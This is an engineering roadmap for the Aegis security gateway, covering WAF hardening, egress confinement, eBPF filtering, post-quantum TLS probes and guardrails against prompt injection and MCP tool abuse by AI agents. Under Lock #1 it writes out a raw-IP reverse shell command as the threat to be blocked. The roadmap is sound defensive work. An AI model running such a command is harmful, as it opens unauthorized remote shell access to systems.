# 🛡️ Aegis Technical Roadmap — Zero-Trust Hardening, GreenOps & AI Security

<p align="center">
  <strong>English</strong> | <a href="ROADMAP.fr.md">Français</a>
</p>

This document is the **single source of truth** for the Aegis engineering roadmap, shared between the open-source repository and the [AIVO Agency architectural case study](https://aivo.fr/en/realisations/aegis-sovereign-gate).

Every item is tracked strictly by **implementation status (`✅ Delivered`, `🚧 Partial`, `⏳ Planned / In Design`)** and **engineering priority (`P0` to `P3`)** — with no arbitrary calendar promises — toward three measurable objectives:
1. Raise real-world interception efficacy against manual Red Team evasion and memory-corruption attacks from **~78% to > 95%**.
2. Enforce **"Assume Breach" defense-in-depth** across containers, Linux kernels, and workstations (`< 10 MB RAM` Rust endpoint posture agent) without per-seat SaaS licensing fees.
3. Extend sovereign perimeter filtering to **AI workloads** (LLM data exfiltration guardrails, sandboxed Agent Harnesses, collaborative P2P CTI, and CPU-only `< 1B` micro-SLMs).

---

## 🧭 Unified Priority & Status Matrix

| Phase | Lock / Module | Status | Priority | Codebase Scope | Core Security & GreenOps Gain |
| :--- | :--- | :---: | :---: | :--- | :--- |
| **v1 Base** | **Ingress WAF, PHP2Shell VP, Pure BFF & RAPL Cockpit** | **✅ Delivered** | **v1 Core** | `gate-proxy`, `backend`, `telemetry-agent`, `web` | `< 1.5 ms` idle edge PEP, HTTP `413` (`32 KB`), `100%` PHP2Shell mitigation (`0%` app CPU), OIDC Pure BFF & live CSRD RAPL PDF/CSV |
| **P0/P1** | **#1 Strict Egress Network Confinement** | **⏳ Planned** | **P0 (Critical)** | `docker-compose*.yml`, `egress-gateway`, eBPF | Blocks raw-IP TCP reverse shells bypassing DNS (`internal: true` bridge + `cgroup/connect4`) |
| **P0/P1** | **#2 Multi-Encoding Normalization (Base64 / HTML)** | **🚧 Partial** | **P1 (High)** | `apps/gate-proxy/src/engine/canonicalizer.ts` | Recursive 3-pass URL & SQL `/*...*/` canonicalization **done**; adds auto Base64/Hex/HTML decoding |
| **P0/P1** | **#3 Volumetric Rate-Limiting & Auto IP Quarantine** | **🚧 Partial** | **P1 (High)** | `apps/gate-proxy/src/quarantine/ip-reputation.ts` | Persistent SOC blacklist **done**; adds sliding-window rate limits (`60 req/10s`) & auto-jail (`< 0.1 ms` drop) |
| **P0/P1** | **#4 HTTP Protocol Hardening (`431`) & Shell-Spawn Watch** | **🚧 Partial** | **P1 (High)** | `apps/gate-proxy/src/`, `apps/telemetry-agent` | `PHP2Shell` & `HTTP 413` **done**; adds strict `431` header caps (`8 KB`), RFC multipart validation & runtime `/bin/sh` spawn alerts |
| **P0/P1** | **#5 Continuous Passive Posture, PQC (`ML-KEM`) & Remediation** | **🚧 Partial** | **P1 (High)** | `apps/backend/internal/scanner/` | Go passive scanner, **PQC `X25519MLKEM768` (FIPS 203)** probe + TLS snippets & CVE Feed **done**; adds scheduled cron audits |
| **P2** | **#6 L3/L4 eBPF / XDP Kernel Filter & CVE Audit** | **⏳ In Design** | **P2 (Medium)** | `apps/telemetry-agent/src/` | NIC-level `XDP_DROP` (`< 0.005 ms`) against malformed TCP SYN options (LSRR/SSRR) + `uname -r` alerts |
| **P2** | **#7 Enterprise DNS Filtering & Shadow IT (DoH/DoT)** | **⏳ Planned** | **P2 (Medium)** | `apps/egress-gateway/src/` | Central DHCP/`:5053` + remote DoH/DoT resolver regulating RAT tools (TeamViewer, AnyDesk, RustDesk) in Prod/DMZ |
| **P2** | **#8 Frugal Rust Endpoint Agent (`< 10 MB`) & PQC `mTLS`** | **⏳ In Design** | **P2 (Medium)** | New `aegis-node-agent` (Rust) + `web` | Cross-platform workstation CVE & hygiene probe over **hybrid post-quantum `mTLS` (`X25519MLKEM768`)** + conditional access |
| **P2** | **#9 "Assume Breach" ZTNA Micro-Segmentation** | **⏳ In Design** | **P2 (Medium)** | Network architecture & PEP | Eliminates direct L3 office-to-DB routes + adds internal ARP/port-scan honeypot alerting |
| **P3** | **#10 "Two-Door" AI Governance & Zero-Secret Egress** | **⏳ In Design** | **P3 (R&D)** | `gate-proxy` (Edge) & `egress-gateway` | Inbound Prompt Injection guardrails + **Zero-Secret Placeholder** (zero API keys in agent sandbox, PII scrubbing & boundary injection) |
| **P3** | **#11 Zero-Trust MCP Gateway & PQC AI Act Ledger** | **⏳ In Design** | **P3 (R&D)** | `gate-proxy`, host `seccomp`/eBPF & `backend` | Per-identity MCP (`tools/list`, `tools/call`) filtering, kernel sandboxing & immutable **`Ed25519 + ML-DSA` (FIPS 204)** audit ledger |
| **P3** | **#12 Collaborative P2P CTI & `< 1B` CPU Micro-SLMs** | **🚧 Partial** | **P3 (R&D)** | `apps/egress-gateway/src/cti/blocklist.ts`, Ollama | Static C2 blocklist + optional **Nimble 9B** (Ollama) **done in v1**; adds live Abuse.ch/CERT-FR/CISA KEV sync, P2P node sharing & `< 1B` CPU-only SLMs |

---

## ✅ v1 / v1.1 Baseline Delivered (Currently Verified in Codebase)

Before listing upcoming locks, the following capabilities are **already implemented and verified** in production Docker compositions:

| Pillar | Verified Codebase Implementation | Proven Benchmark / Evidence |
| :--- | :--- | :--- |
| **Ingress PEP & Virtual Patching** | [`apps/gate-proxy/src/server.ts`](apps/gate-proxy/src/server.ts), [`engine/inspector.ts`](apps/gate-proxy/src/engine/inspector.ts), [`engine/entropy.ts`](apps/gate-proxy/src/engine/entropy.ts), [`rules/zeroday.rule.ts`](apps/gate-proxy/src/rules/zeroday.rule.ts) | `CVE-2024-4577` PHP2Shell burst benchmark: **`602 / 602` blocked (`100%`)**, **`0%` PHP-FPM CPU**, **`5.81 W` avg** vs **`24.14 W` avg (`37.58 W` peak)** & **`743.4%` CPU** unshielded (**`×4.34` extra energy wasted**) |
| **Pure BFF Token Handler** | [`apps/gate-proxy/src/bff/auth-handler.ts`](apps/gate-proxy/src/bff/auth-handler.ts), [`bff/session.ts`](apps/gate-proxy/src/bff/session.ts) | Zero JWTs in browser `localStorage`/JS; AES-256-GCM encrypted `HttpOnly` cookies; agnostic OIDC (Keycloak, Authelia, Okta, Standalone) |
| **Egress DNS Sinkhole & SLM v1** | [`apps/egress-gateway/src/index.ts`](apps/egress-gateway/src/index.ts), [`dns/udp-server.ts`](apps/egress-gateway/src/dns/udp-server.ts), [`engine/system-one.ts`](apps/egress-gateway/src/engine/system-one.ts) | UDP/TCP `:5053` DNS Sinkhole (`0.0.0.0`), Shannon DGA entropy scoring (`H > 4.2`), static CTI blocklist & optional **Nimble 9B** (`ollama-nimble:11434`) air-gapped SLM |
| **Hardware RAPL Telemetry & CSRD** | [`apps/telemetry-agent/src/main.rs`](apps/telemetry-agent/src/main.rs), `collector/rapl.rs`, `collector/cpu.rs`, TimescaleDB | Real Linux `/sys/class/powercap` Watts + `/proc/stat` CPU ingestion, Kepler eBPF K8s support, Scope 2 PDF & CSV CSRD reports |
| **Cockpit SOC, PQC Scanner & CVE Feed** | [`apps/backend/internal/scanner/engine.go`](apps/backend/internal/scanner/engine.go), [`scanner/pqc.go`](apps/backend/internal/scanner/pqc.go), [`internal/service/cve_service.go`](apps/backend/internal/service/cve_service.go), `apps/web` | Live SSE triage stream, 5-page non-intrusive domain security, EcoIndex & **NIST FIPS 203 `X25519MLKEM768` Post-Quantum probe**, interactive CVE coverage catalog |

---

## 🔥 Phase P0 / P1 — Edge, Egress & Continuous Posture Hardening

### 🔒 Lock #1: Strict Egress Network Confinement (Anti-Raw-IP Reverse Shell)
- **Status:** ⏳ Planned
- **Priority:** Critical (**P0**) — Prerequisite before multi-tenant untrusted workload exposure
- **Security Gain:** Jumps from `0%` to `~98%` neutralization on direct raw-IP socket callbacks (`connect()` without DNS)
- **Current Codebase Gap:**
  [`apps/egress-gateway`](apps/egress-gateway/src/index.ts) intercepts UDP/TCP DNS queries (`:5053`) and explicit HTTP checks. However, in [`docker-compose.yml`](docker-compose.yml) (default bridge) and [`docker-compose.dokploy.yml`](docker-compose.dokploy.yml) (`aegis-internal` bridge without `internal: true`), a compromised worker process executing `/bin/sh -i >& /dev/tcp/185.220.101.99/4444` can reach external IPs directly without DNS resolution.
- **Technical Action Plan:**
  1. Declare `aegis_internal_sandbox` with `internal: true` in Docker Compose definitions (zero default Internet gateway route).
  2. Attach backend databases (`aegis_timescaledb`) and application runtimes **exclusively** to `aegis_internal_sandbox`, while dual-homing `aegis_gate_proxy` and `aegis_egress_gateway`.
  3. Pin container DNS resolution strictly to `egress-gateway:5053`.
  4. *(Linux Bare-Metal Evolution)*: Attach a kernel-level `cgroup/connect4` (`sys_enter_connect`) eBPF hook allowing outbound sockets **only** toward IPs previously resolved and cleared by `egress-gateway` (60s TTL).

### 🔒 Lock #2: Multi-Encoding Normalization & Anti-Obfuscation
- **Status:** 🚧 Partial (`canonicalizeInput` v1 URL/SQL/Null-byte active)
- **Priority:** High (**P1**)
- **Security Gain:** **+12% to +15%** detection against manual obfuscation and double-encoded evasion vectors
- **Current Codebase State:**
  [`canonicalizeInput`](apps/gate-proxy/src/engine/canonicalizer.ts) already executes up to 3 passes of `decodeURIComponent`, strips null bytes (`\0`), removes inline SQL comments (`/*...*/`), and collapses whitespace inside [`WafInspector.inspect`](apps/gate-proxy/src/engine/inspector.ts).
- **Remaining Technical Action Plan:**
  1. Decode suspicious Base64 blocks (`> 16` chars), hexadecimal escapes (`\x..`), and HTML/Unicode entities (`&#x...;`, `\u00..`) found inside query strings, headers, and bodies prior to evaluating `ZERODAY_EXPLOIT_REGEX`, `RCE_REGEX`, and `SQLI_REGEX`.
  2. Normalize path segments (`/./`, `//`, Windows `\`) before `TRAVERSAL_REGEX` inspection.

### 🔒 Lock #3: Volumetric Rate-Limiting & Automated IP Auto-Quarantine
- **Status:** 🚧 Partial (`IpReputationManager` SOC blacklist active)
- **Priority:** High (**P1**)
- **Security Gain:** Neutralizes **99%** of automated fuzzing loops and high-speed credential brute-forcing
- **Current Codebase State:**
  [`IpReputationManager`](apps/gate-proxy/src/quarantine/ip-reputation.ts) & [`server.ts`](apps/gate-proxy/src/server.ts) already enforce SOC-synced manual/API IP blacklists. However, triggering a single `403`/`413` does not automatically rate-limit or throttle subsequent burst attempts from the same unbanned source IP.
- **Remaining Technical Action Plan:**
  1. Add a sliding-window counter (`60 req / 10s` per IP on dynamic routes) with immediate HTTP `429 Too Many Requests`.
  2. Implement an automated **Jail threshold**: any unauthenticated IP accumulating `3` critical WAF blocks (`risk_score >= 90`) within `5` minutes enters automated **15-minute quarantine** (`< 0.1 ms` pre-body drop).
  3. Expose live auto-jail expirations and manual unban controls in the Cockpit UI + `POST /api/v1/dashboard/reset`.

### 🔒 Lock #4: HTTP Protocol Hardening (`431`), Multipart RFC & Shell-Spawn Watch
- **Status:** 🚧 Partial (`PHP2Shell` Virtual Patch & `HTTP 413 > 32 KB` active)
- **Priority:** High (**P1**)
- **Current Codebase State:**
  [`zeroday.rule.ts`](apps/gate-proxy/src/rules/zeroday.rule.ts) and [`inspector.ts`](apps/gate-proxy/src/engine/inspector.ts) already block `CVE-2024-4577` PHP2Shell (`100%` verified) and payloads exceeding `AEGIS_MAX_PAYLOAD_BYTES` (`32 KB`) with `HTTP 413`.
- **Remaining Technical Action Plan:**
  1. **Protocol Hardening in `gate-proxy`**: Enforce header budgets (`> 8 KB` total / `> 4 KB` per header returning `HTTP 431`), strict `multipart/form-data` RFC boundary & depth validation (`<= 3` nested boundaries), and chunked/compression-bomb ratio caps.
  2. **Runtime Shell-Spawn Anomaly Telemetry**: Extend [`apps/telemetry-agent`](apps/telemetry-agent/src/main.rs) (`/proc` process tree inspection) to raise a critical alert if web runtimes (`php-fpm`, `node`, `nginx`) unexpectedly spawn child interpreters (`/bin/sh`, `/bin/bash`, `python`).

### 🔒 Lock #5: Continuous Passive Posture Monitoring, Post-Quantum Probe (`ML-KEM`) & Guided Remediation
- **Status:** 🚧 Partial (On-demand Go 1.25 scanner, **Post-Quantum Readiness `X25519MLKEM768` probe**, TLS snippets & CVE Feed active)
- **Priority:** High (**P1**)
- **Current Codebase State:**
  [`apps/backend/internal/scanner/engine.go`](apps/backend/internal/scanner/engine.go), [`scanner/pqc.go`](apps/backend/internal/scanner/pqc.go), and [`internal/service/cve_service.go`](apps/backend/internal/service/cve_service.go) already audit target domains for security headers, hierarchical DNS (RFC 7489 DMARC / RFC 7208 SPF), EcoIndex score, known CVEs, and **NIST FIPS 203 `X25519MLKEM768` (`0x11ec`) Post-Quantum TLS 1.3 negotiation** with *Harvest Now, Decrypt Later (HNDL)* risk grading and copy-paste Traefik, Nginx, Caddy, and Go remediation snippets.
- **Remaining Technical Action Plan:**
  1. Schedule **periodic continuous background scans** for enrolled tenant domains and alert immediately on regressions (expiring TLS certificates, PQC downgrade, newly exposed headers/ports, drifted EcoIndex grade).
  2. Expand the **guided copy-paste remediation wizard** inside the Cockpit Diagnostics & CVE Feed views (already delivered for Post-Quantum TLS) to cover all security headers and `php.ini` / Apache directives.
  3. **Sovereign CERT-FR Ingestion & Continuous Vulnerability Qualification**:
     - Sovereign on-demand sync connector (and controlled local cron) parsing the official **CERT-FR (ANSSI)** feed with zero data leakage to US third parties and no rate-limited API dependencies.
     - Immediate labeling of newly ingested, uncurated alerts under **`"Procedure under verification (Aegis Lab)"`** (`PENDING_VERIFICATION`) status, ensuring cryptographic and technical integrity until a formal Virtual Patching rule or host remediation procedure is verified.
  4. **Composite Security Scoring & Software Vulnerability Weighting (Zero Fake-Positive)**:
     - Unified global security scoring combining transport headers (HSTS, CSP, X-Frame-Options, nosniff), DNS resilience (SPF/DMARC), and software exposition penalties weighted by CVSS severity (`-15 pts` per CRITICAL CVE, `-10 pts` per HIGH CVE, etc.).
     - Eliminates misleading "100/100 (A)" scores on domains exposing critical unmitigated vulnerabilities (e.g. PHP-CGI RCE, volumetric buffer overflow, Next.js middleware authorization bypass).

---

## 🛡️ Phase P2 — Kernel Defense, Frugal Rust Endpoint Agent & ZTNA

### 🔒 Lock #6: L3/L4 `eBPF / XDP` Network Filter & Host Kernel Watch
- **Status:** ⏳ In Design
- **Priority:** Medium (**P2** — Linux Host / Bare-Metal)
- **Technical Plan:**
  1. Extend [`apps/telemetry-agent`](apps/telemetry-agent/src/main.rs) with an `xdp` eBPF program attached at the NIC driver layer to discard malformed IPv4 TCP SYN packets carrying dangerous IP options (`IPOPT_LSRR`, `IPOPT_SSRR`, `IPOPT_RR` — e.g., kernel TCP stack UAF vectors like CVE-2026-98432) in `< 0.005 ms` (`XDP_DROP`).
  2. Read host kernel release (`uname -r`) continuously and surface actionable distro upgrade alerts in the Cockpit when running unpatched kernels.

### 🔒 Lock #7: Centralized Enterprise DNS Filtering & Shadow IT Governance
- **Status:** ⏳ Planned
- **Priority:** Medium (**P2**)
- **Technical Plan:**
  1. Operate [`apps/egress-gateway`](apps/egress-gateway/src/index.ts) (`:5053`) as the central sovereign corporate DNS resolver distributed via office DHCP, plus **DNS-over-HTTPS (DoH)** and **DNS-over-TLS (DoT)** profiles for remote workstations — preserving full frugality by avoiding heavy corporate MITM TLS termination proxies.
  2. Categorize Remote Access Tools (**RAT**: TeamViewer, AnyDesk, RustDesk, LogMeIn, VNC) so admins can enforce subnet rules (e.g., *block all remote desktop traffic originating from DMZ/production databases*) and sinkhole second-stage C2 implants (Sliver, Cobalt Strike) attempting callback after client-side exploits (e.g., TeamViewer URL injection families).

### 🔒 Lock #8: Frugal Rust Endpoint Posture Agent (`< 10 MB RAM`) & Post-Quantum `mTLS` Channel
- **Status:** ⏳ In Design
- **Priority:** Medium (**P2**)
- **Context & Philosophy:** Heavy commercial EDR suites consume `1–2 GB RAM` per laptop with recurring per-seat SaaS costs. Aegis introduces `aegis-node-agent` in compiled native Rust (`< 10 MB RAM`, `~0% idle CPU`) as a sovereign posture and vulnerability probe.
- **Technical Plan:**
  1. Standalone cross-platform binary for Linux (`systemd`), macOS (`launchd`), and Windows (native service) with single-use ephemeral token enrollment.
  2. Local software inventory & CVE checks (e.g., flagging vulnerable TeamViewer `< 15.83`, outdated OpenSSL/sudo, browsers) + basic OS hygiene (BitLocker/FileVault/LUKS disk encryption, local firewall, OS updates).
  3. **Post-Quantum Hybrid `mTLS` Heartbeat (`X25519MLKEM768` — NIST FIPS 203)** (`POST /api/v1/endpoints/posture`) between Rust probes (`rustls-post-quantum`) and the Go 1.25 Control Plane to immunize infrastructure telemetry against *Harvest Now, Decrypt Later (HNDL)* interception, feeding **ZTNA Conditional Access** decisions in `gate-proxy`.

### 🔒 Lock #9: "Assume Breach" ZTNA Micro-Segmentation
- **Status:** ⏳ In Design
- **Priority:** Medium (**P2**)
- **Technical Plan:**
  1. Enforce VLAN separation eliminating direct L3 IP routes from office workstations / guest Wi-Fi to core datastores (TimescaleDB, PostgreSQL, ERP).
  2. Route internal human & admin access strictly through `gate-proxy` PEP with mandatory MFA / mTLS device-posture verification.
  3. Embed ARP/port-scan anomaly detection (internal honeypot tripwire) to raise immediate critical alerts if a compromised workstation probes internal server subnets.

---

## 🤖 Phase P3 — AI Security, "Two-Door" MCP Gateway & Collaborative CTI

### 🔒 Lock #10: "Two-Door" Architecture & Outbound "Zero-Secret Placeholder" Injection (AI DLP)
- **Status:** ⏳ In Design
- **Priority:** Strategic R&D (**P3**)
- **Context:** As enterprises connect internal APIs, CRMs, and documents to LLMs and autonomous workflows, both inbound prompt paths and outbound model egress expose API keys and sensitive records to Prompt Injection exfiltration.
- **Technical Plan:**
  1. **Door 1 — Inbound Edge Prompt Guardrails (`gate-proxy`)**: Combine deterministic heuristics, entropy/structural checks, and token-budget limits to block **Prompt Injections & Jailbreaks** before they reach internal AI backends.
  2. **Door 2 — "Zero-Secret Placeholder" Pattern & Outbound DLP (`egress-gateway`)**: The AI agent runtime holds **zero real API keys** in memory or environment variables (only a local dummy token `AEGIS_PLACEHOLDER_KEY`). `egress-gateway` scrubs regulated PII (GDPR), source code, and internal secrets on the fly, injecting the real external API credential strictly at the outbound network boundary after policy verification.

### 🔒 Lock #11: Zero-Trust MCP Gateway (Per-Identity Tool Filtering) & Post-Quantum AI Act Ledger
- **Status:** ⏳ In Design
- **Priority:** Strategic R&D (**P3**)
- **Context:** Multi-agent orchestrators rely on the **Model Context Protocol (MCP)** to invoke privileged tools (SQL queries, shell scripts, business APIs), creating severe privilege-escalation risks via indirect prompt injection.
- **Technical Plan:**
  1. **Per-Identity MCP Tool Filtering (`tools/list` & `tools/call`)**: Native JSON-RPC MCP inspection inside `gate-proxy` that dynamically filters exposed tool catalogs and authorizes each `tools/call` against the caller's OIDC / SPIFFE identity, combined with ephemeral Linux kernel sandboxing (`seccomp-bpf` syscall filters, `eBPF` hooks, isolated namespaces).
  2. **Post-Quantum Signed Immutable Decision Ledger (EU AI Act)**: Append-only cryptographic audit trail in TimescaleDB capturing every autonomous agent tool call, sealed with a **hybrid classical + post-quantum dual signature (`Ed25519 + ML-DSA-65` — NIST FIPS 204)** to guarantee long-term non-repudiation under the **European AI Act**.

### 🔒 Lock #12: Collaborative P2P CTI & `< 1B` CPU-Only Specialized Micro-SLMs
- **Status:** 🚧 Partial (Static C2 blocklist + optional `Nimble 9B` Ollama active in v1)
- **Priority:** Strategic R&D (**P3**)
- **Current Codebase State (v1):** [`apps/egress-gateway/src/cti/blocklist.ts`](apps/egress-gateway/src/cti/blocklist.ts) loads an initial CrowdSec/exfil blocklist, paired optionally with the sovereign **Nimble 9B** local SLM container (`ollama-nimble:11434` defined in `docker-compose.yml`).
- **Evolution Roadmap:**
  1. **Live Open-Source CTI Synchronization**: Automated ingestion of consolidated C2 & malicious IP feeds (**Abuse.ch URLhaus**, **ThreatFox**, **CERT-FR**, **CISA KEV**) in `O(1)` lookup (`< 0.05 ms`, `< 5 MB RAM`).
  2. **Decentralized Sovereign P2P Reputation**: Opt-in cryptographic peer-to-peer sharing of confirmed hostile scanner IPs and indicators across Aegis nodes without delegating telemetry to a foreign cloud monopoly.
  3. **Ultra-Frugal CPU-Only Micro-SLMs (`< 1B` parameters)**: Complement or replace the optional `Nimble 9B` service with quantized sub-1-billion-parameter security classification models running purely on standard CPUs (*air-gapped*, zero GPU farm required).
